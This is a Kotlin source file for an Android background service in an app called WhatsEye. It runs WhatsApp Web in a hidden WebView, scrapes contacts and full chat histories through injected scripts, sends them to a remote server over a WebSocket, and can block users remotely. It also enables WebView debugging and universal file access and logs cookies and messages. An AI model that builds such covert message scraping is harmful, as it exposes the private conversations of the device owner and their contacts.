package com.example.whatseye.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.example.whatseye.MainActivity
import com.example.whatseye.api.managers.JwtTokenManager
import com.example.whatseye.api.ws.WebSocketClientGeneral
import com.example.whatseye.api.ws.WebSocketGeneralManager
import com.example.whatseye.dataType.JavaScriptCode
import com.example.whatseye.utils.createNotification
import com.example.whatseye.utils.createNotificationChannel
import org.json.JSONObject

class AlwaysRunningService : Service() {

    @SuppressLint("StaticFieldLeak")
    companion object {
        private var instance: AlwaysRunningService? = null

        fun getInstance(): AlwaysRunningService? {
            return instance
        }
    }

    private val TAG = "AlwaysRunningService"
    private val CHANNEL_ID = "AlwaysRunningServiceChannel"
    private var webSocketManager: WebSocketClientGeneral? = null
    private lateinit var webView: WebView
    private val MAX_RETRIES = 100
    private val POLL_DELAY_MS = 1800L
    private var retryCount = 0
    private var checkLoginCount = 0
    private var isLoggedIn = false
    private val handler = Handler(Looper.getMainLooper())
    private val checkLoginRunnable = Runnable { checkLogin() }
    private var hasWebViewRun = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "Service created")
        createNotificationChannel(this, CHANNEL_ID, "Always Running Service Channel")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

        val notification = createNotification(this, CHANNEL_ID, "Always Running Service", "This service is running in the background.")
        startForeground(1, notification)

        if (JwtTokenManager(this).getIsLogin() && JwtTokenManager(this).getIsLoginWhatsApp() && !hasWebViewRun) {
            Log.d(TAG, "Initializing WebSocket and WebView...")
            webSocketManager = WebSocketGeneralManager.getInstance(this)
            webView = WebView(this)
            setupWebView()
            retryCount = 0
            loadWhatsAppWeb()
            hasWebViewRun = true
        }

        return START_STICKY
    }

    @SuppressLint("SetJavaScriptEnabled",  "NewApi")
    private fun setupWebView() {
        Log.d(TAG, "Setting up WebView")
        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true

            allowFileAccess = true
            allowContentAccess = true


            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                allowUniversalAccessFromFileURLs = true
            }

            WebView.setWebContentsDebuggingEnabled(true)
            cacheMode = WebSettings.LOAD_CACHE_ELSE_NETWORK
            //userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                Log.d(TAG, "WebView page finished loading: $url")
                restoreCookies()
                webView.evaluateJavascript("""(()=>{document.body.style.zoom = "70%";})();""",null)
                retryCount = 0
                checkLogin()
            }
        }
    }

    private fun loadWhatsAppWeb() {
        Log.d(TAG, "Loading WhatsApp Web")
        webView.loadUrl("https://web.whatsapp.com")
        ensureCookiesAccepted()
        restoreCookies()
    }

    private fun ensureCookiesAccepted() {
        Log.d(TAG, "Accepting cookies")
        CookieManager.getInstance().setAcceptCookie(true)
    }

    private fun restoreCookies() {
        Log.d(TAG, "Restoring cookies")
        val sharedPreferences = getSharedPreferences("whatsapp_prefs", MODE_PRIVATE)
        val savedCookies = sharedPreferences.getString("whatsapp_cookies", null)
        savedCookies?.let {
            CookieManager.getInstance().setCookie("https://web.whatsapp.com", it)
            Log.d(TAG, "Cookies restored: $it")
        }
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun checkLogin() {
        Log.d(TAG, "Checking login status...")
        val jsCode = """
            (function() {
                return document.querySelector('div[aria-rowcount]') !== null;
            })();
        """.trimIndent()

        webView.evaluateJavascript(jsCode) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "User is logged in")
                handler.removeCallbacks(checkLoginRunnable)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
                }
                isLoggedIn = true
            } else if (checkLoginCount < MAX_RETRIES) {
                Log.d(TAG, "Login not detected yet, retrying ($checkLoginCount/$MAX_RETRIES)...")
                checkLoginCount++
                handler.postDelayed(checkLoginRunnable, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Login check max retries reached")
                startPollingForElement()
            }
        }
    }

    private fun startPollingForElement() {
        Log.d(TAG, "Polling for login error element...")
        val jsCheckElement = """
            (function() {
                return document.querySelector('[role="img"]') !== null;
            })();
        """.trimIndent()

        webView.evaluateJavascript(jsCheckElement) { result ->
            if (result?.toBoolean() == true) {
                Log.d(TAG, "Login error element found, relaunching app")
                JwtTokenManager(this@AlwaysRunningService).setIsLoginWhatsApp(false)
                val intent = Intent(this@AlwaysRunningService, MainActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                startActivity(intent)
            } else if (retryCount < 20) {
                Log.d(TAG, "Polling retry ($retryCount/20)")
                retryCount++
                handler.postDelayed({ startPollingForElement() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Polling failed, reloading WebView")
                webView.reload()
            }
        }
    }

    private fun loadContact() {
        Log.d(TAG, "Trying to load contact via JS")
        retryCount = 0
        webView.evaluateJavascript(
            """
            (function() {
                const button = document.querySelector("span[data-icon='new-chat-outline']");
                if (button) button.click();
                return button != null;
            })();
            """.trimIndent()
        ) { success ->
            Log.d(TAG, "New chat button click success: $success")
            if (success.toBoolean()) {
                webView.evaluateJavascript(JavaScriptCode.CONTACT) {
                    Log.d(TAG, "CONTACT script injected")
                    checkContact()
                }
            } else {
                Log.e(TAG, "Failed to click new chat button")
            }
        }
    }

    private fun checkContact() {
        Log.d(TAG, "Checking for CONTACT item in localStorage...")
        webView.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("CONTACT") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "CONTACT item found, extracting...")
                webView.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CONTACT");
                        localStorage.removeItem("CONTACT");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    Log.d(TAG, "Extracted contact data: $html")
                    html?.let {
                        webSocketManager?.sendContact(it)
                        Log.d(TAG, "Contact sent via WebSocket")
                    }
                }
            } else if (retryCount < 60) {
                Log.d(TAG, "No contact yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkContact() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Contact fetch timed out, reloading WebView")
                webView.reload()
            }
        }
    }

    private fun loadCurrentChats() {
        retryCount = 0
        webView.evaluateJavascript("""(()=>{
            const a = document.querySelector("span[data-icon='back']");
            if (a) a.click();
        })();""".trimIndent()){
            webView.evaluateJavascript(JavaScriptCode.CURRENT_CHATS){
                checkCurrentChat()
            } }
    }

    private fun checkCurrentChat(){
        webView.evaluateJavascript(
            """( ()=>{  
                        return localStorage.getItem("CURRENT_CHATS") !== null;
            })();""".trimIndent()
        ) {  data ->
            if (data.toBoolean()) {
                webView.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CURRENT_CHATS");
                        localStorage.removeItem("CURRENT_CHATS");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    Log.d(TAG, "Extracted contact data: $html")
                    html?.let {
                        webSocketManager?.sendContactChat(it)
                        Log.d(TAG, " Chat sent via WebSocket")
                    }
                }
            } else if (retryCount < 60) {
                Log.d(TAG, "No contact yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkCurrentChat() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Contact fetch timed out, reloading WebView")
                webView.reload()
            }
        }
    }



    private var selectRoomRetryCount = 0
    private var scrollContentRetryCount = 0

    fun selectRoom(name: String) {
        selectRoomRetryCount = 0
        webView.evaluateJavascript(
            """(() => {  
                localStorage.removeItem("ROOM_SELECTED") 
                localStorage.removeItem("CHATS");
                localStorage.removeItem("DONE_LOADING_CHAT") 
                localStorage.removeItem("DONE_LOADING_CHAT2") 
                })();""".trimIndent(),null)
        val escapedName = JSONObject.quote(name)
        Log.d(TAG, "Selecting room: $name (escaped: $escapedName)")

        webView.evaluateJavascript("""${JavaScriptCode.SELECT_ROOM}($escapedName);""") {
            Log.d(TAG, "Room selection JavaScript executed, starting selectRoomFinished()")
            selectRoomFinished()
        }
    }

    private fun selectRoomFinished() {
        webView.evaluateJavascript(
            """(() => { return localStorage.getItem("ROOM_SELECTED") !== null; })();""".trimIndent()
        ) { data ->
            val isLoaded = data?.toBooleanStrictOrNull() ?: false
            if (isLoaded) {
                scrollContent2()
            } else if (selectRoomRetryCount < 60) {
                Log.d(TAG, "Room not selected yet, retrying (${selectRoomRetryCount + 1}/60)")
                selectRoomRetryCount++
                handler.postDelayed({ selectRoomFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to select room, reloading WebView")
                webView.reload()
            }
        }
    }

    private fun scrollContent() {
        scrollContentRetryCount = 0
        Log.d(TAG, "Initiating content scroll")
        webView.evaluateJavascript(JavaScriptCode.CHAT_ROOM_SCROLLER) {
            Log.d(TAG, "Scroll JavaScript executed, checking if content loaded")
            scrollContentFinished()
        }
    }

    private fun scrollContentFinished() {
        webView.evaluateJavascript(
            """(() => { return localStorage.getItem("DONE_LOADING_CHAT") !== null; })();""".trimIndent()
        ) { data ->
            val isLoaded = data?.toBooleanStrictOrNull() ?: false
            if (isLoaded) {
                scrollContent2()
                } else if (scrollContentRetryCount < 60) {
                Log.d(TAG, "scroll not loaded yet, retrying (${scrollContentRetryCount + 1}/60)")
                scrollContentRetryCount++
                handler.postDelayed({ scrollContentFinished() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to load chat, reloading WebView")
                webView.reload()
            }
        }
    }

    private fun scrollContent2() {
        scrollContentRetryCount = 0
        Log.d(TAG, "Initiating content scroll")
        webView.evaluateJavascript(JavaScriptCode.CHAT_ROOM_SCROLLER2) {
            Log.d(TAG, "Scroll JavaScript executed, checking if content loaded")
            scrollContentFinished2()
        }
    }

    private fun scrollContentFinished2() {
        webView.evaluateJavascript(
            """(() => { return localStorage.getItem("DONE_LOADING_CHAT2") !== null; })();""".trimIndent()
        ) { data ->
            val isLoaded = data?.toBooleanStrictOrNull() ?: false
            if (isLoaded) {
                chatContent()
            } else if (scrollContentRetryCount < 60) {
                Log.d(TAG, "scroll not loaded yet, retrying (${scrollContentRetryCount + 1}/60)")
                scrollContentRetryCount++
                handler.postDelayed({ scrollContentFinished2() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Timeout reached: failed to load chat, reloading WebView")
                webView.reload()
            }
        }
    }


    fun chatContent() {
        Log.d(TAG, "Chat content is fully loaded, extracting chat")
        webView.evaluateJavascript(JavaScriptCode.GET_CHAT) { html ->
            checkChat()
        }

    }

    private fun checkChat() {
        Log.d(TAG, "Checking for CONTACT item in localStorage...")
        webView.evaluateJavascript(
            """
            (function() {
                return localStorage.getItem("CHATS") !== null;
            })();
            """.trimIndent()
        ) { data ->
            if (data.toBoolean()) {
                Log.d(TAG, "CONTACT item found, extracting...")
                webView.evaluateJavascript(
                    """
                    (function() {
                        const data = localStorage.getItem("CHATS");
                        return data;
                    })();
                    """.trimIndent()
                ) { html ->
                    html?.let {
                        webSocketManager?.sendChat(it)
                        Log.d(TAG, "Chat sent via WebSocket")
                    }
                }
            } else if (retryCount < 60) {
                Log.d(TAG, "No contact yet, retrying ($retryCount/60)")
                retryCount++
                handler.postDelayed({ checkChat() }, POLL_DELAY_MS)
            } else {
                Log.e(TAG, "Contact fetch timed out, reloading WebView")
                webView.reload()
            }
        }
    }


    fun getChatRoom(name: String) {
        selectRoom(name)
    }


    fun blockChat(name: String) {
        val escapedName = JSONObject.quote(name) // ensures quotes and escaping
        webView.evaluateJavascript(
            """${JavaScriptCode.BLOCK_USER}($escapedName);"""
        ) {
            webSocketManager?.sendBlockedChat()
        }
    }

    fun getContactChat() {
        Log.d(TAG, "getContact() triggered")
        loadCurrentChats()
    }

    fun getContact() {
        Log.d(TAG, "getContact() triggered")
        loadContact()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        Log.d(TAG, "Service destroyed")
        handler.removeCallbacks(checkLoginRunnable)
        webView.destroy()
        webSocketManager = null
        instance = null
        super.onDestroy()
    }
}
